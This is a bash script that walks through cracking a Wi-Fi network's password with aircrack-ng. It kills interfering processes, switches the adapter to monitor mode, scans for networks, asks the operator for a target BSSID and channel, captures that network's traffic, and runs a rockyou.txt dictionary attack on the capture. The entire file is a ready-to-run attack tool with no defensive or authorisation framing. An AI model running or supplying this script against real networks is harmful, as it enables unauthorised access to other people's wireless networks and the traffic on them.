#! bin/bash 
 iwconfig
 sleep 2
echo "what is your adapter "
read  wlan
sleep 2
sudo airmon-ng check kill
sleep 2
sudo  airmon-ng start $wlan 
sleep 2
iwconfig
sleep 2
sudo airodump-ng $wlan
sleep 2
echo "select your target "
read bssid
sleep 2
echo "what is channel of the target"
read channel 
sleep 2
sudo airodump-ng -w hack1 -c $channel --bssid $bssid $wlan
sleep 2
sudo airmon-ng stop $wlan

echo "now is cracking wifi (30s)"
sleep 3 
echo "Rockyou.txt"
wordlists="/usr/share/wordlists/rockyou.txt"
sleep 2
echo "Now I'm cracking this Network"
sleep 2 
sudo aircrack-ng hack1-01.cap -w $wordlists  

  
 



 